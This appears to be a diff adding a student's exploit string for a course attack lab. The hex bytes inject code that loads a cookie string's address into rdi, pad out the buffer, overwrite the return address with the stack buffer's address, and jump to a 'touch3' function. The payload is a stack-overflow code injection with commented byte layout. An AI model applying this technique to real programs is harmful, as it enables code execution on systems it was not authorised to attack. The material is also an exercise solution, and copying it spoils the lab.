@@ -1,0 +1,14 @@
+48 c7 c7 d0 a9 66 55 c3 00 00  	//Address to the cookie string at the bottom
+								//This is 72 bytes from the base address of this buffer
+								//It will go to this address when executed
+								//Move the location of the string to rdi
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00
+88 a9 66 55 00 00 00 00			//Address to the buffer, execute the code
+f2 17 40 00 00 00 00 00			//Address to touch 3
+37 33 30 62 33 30 65 62 00		//String
+
+
